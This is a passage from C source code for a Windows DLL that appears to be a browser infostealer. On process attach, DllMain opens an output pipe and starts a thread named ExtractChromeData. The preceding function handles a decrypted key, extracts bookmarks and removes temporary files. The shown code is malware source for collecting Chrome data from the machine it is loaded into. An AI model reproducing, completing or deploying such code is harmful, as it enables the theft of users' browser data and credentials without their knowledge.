    ExtractBookmarksFromFile();

_END_OF_FUNC:

    HEAP_FREE_SECURE(g_pbDecryptedKey, g_cbDecryptedKey);

    CleanupTempFiles();

    DBGA_CLOSE();

    return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) 
{
    HANDLE hThread = NULL;

    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);

            g_bPipeInitialized = InitializeOutputPipe(&g_hPipe);

            if (!(hThread = CreateThread(NULL, 0, ExtractChromeData, NULL, 0, NULL)))
            {
                DBGA("[!] CreateThread Failed With Error: %lu", GetLastError());
                break;
            }

            CloseHandle(hThread);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}